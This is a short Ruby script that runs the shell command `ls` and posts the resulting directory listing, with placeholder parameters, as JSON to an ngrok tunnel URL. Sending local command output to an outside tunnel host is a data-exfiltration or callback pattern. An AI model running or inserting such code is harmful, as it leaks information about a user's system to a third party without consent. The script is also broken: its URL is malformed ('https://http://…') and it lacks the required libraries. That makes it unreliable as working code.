#!/bin/ruby

ls_result = `ls`

uri = URI('https://http://b6c7c56f.ngrok.io/events')
req = Net::HTTP::Post.new(uri, initheader = {'Content-Type' =>'application/json'})
req.body = {param1: 'some value', param2: 'some other value', ls: ls_result}.to_json
res = Net::HTTP.start(uri.hostname, uri.port) do |http|
  http.request(req)
end
